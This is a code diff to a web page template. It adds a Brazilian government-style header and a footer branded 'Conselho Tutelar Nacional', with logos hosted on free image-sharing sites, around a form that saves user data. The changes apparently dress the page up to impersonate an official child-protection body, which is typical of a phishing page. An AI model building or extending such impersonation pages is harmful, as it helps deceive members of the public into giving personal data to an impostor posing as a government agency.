@@ -97,7 +97,31 @@ def index():
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 </head>
-<body class="bg-gray-50 min-h-screen">
+<body class="flex flex-col min-h-screen bg-gray-50">
+    <!-- Government Header -->
+    <header class="bg-[#222222] text-white py-2">
+        <div class="container mx-auto flex justify-between items-center px-4">
+            <a class="font-bold text-sm" href="#">
+                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo Governo" class="h-6" />
+            </a>
+            <nav>
+                <ul class="flex space-x-4 text-[10px]">
+                    <li>
+                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">TRANSPARÊNCIA</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">OUVIDORIA</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="flex-grow">
     <div class="max-w-2xl mx-auto px-4 py-6">
         <div class="text-center mb-4">
             <div class="bg-slate-800 text-white rounded-lg p-4 mb-4 shadow-lg">
@@ -274,6 +298,30 @@ def index():
         console.log('Dados salvos:', userData);
     });
     </script>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-[#1451B4] text-white py-6 mt-8">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col md:flex-row justify-between items-center">
+                <div class="mb-4 md:mb-0">
+                    <div class="flex items-center mb-2">
+                        <img src="https://i.postimg.cc/5NvvmF2C/506e4525-b3e0-4703-85c5-24050ba28e3f-removalai-preview.png" alt="Logo Conselho Tutelar" class="h-8 mr-3" />
+                        <div>
+                            <h4 class="font-bold text-sm">Conselho Tutelar Nacional</h4>
+                            <p class="text-xs text-blue-200">Proteção da Criança e do Adolescente</p>
+                        </div>
+                    </div>
+                    <p class="text-xs text-blue-200">Lei nº 8.069/90 - Estatuto da Criança e do Adolescente</p>
+                    <p class="text-xs text-blue-300">Disque 100 - Direitos Humanos</p>
+                </div>
+                <div class="flex space-x-4 mt-4 md:mt-0">
+                    <a href="#" class="text-white hover:text-gray-200"><i class="fab fa-facebook-square"></i></a>
+                    <a href="#" class="text-white hover:text-gray-200"><i class="fab fa-instagram"></i></a>
+                </div>
+            </div>
+        </div>
+    </footer>
 </body>
 </html>'''
 
